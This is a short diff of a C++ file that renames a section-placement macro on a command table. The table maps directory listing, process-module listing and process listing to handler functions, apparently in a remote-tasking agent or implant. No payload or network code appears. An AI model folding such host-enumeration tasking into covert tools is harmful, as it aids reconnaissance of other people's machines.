@@ -1,7 +1,7 @@
 #include <core/include/commands.hpp>
 namespace Commands {
 
-    _code_seg(".rdata") _command_map cmd_map[] = {
+    __code_seg(".rdata") _command_map cmd_map[] = {
         {.name = DIRECTORYLIST, .address = Commands::DirectoryList  },
         {.name = PROCESSMODULES,.address = Commands::ProcessModules },
         {.name = PROCESSLIST,	.address = Commands::ProcessList    },
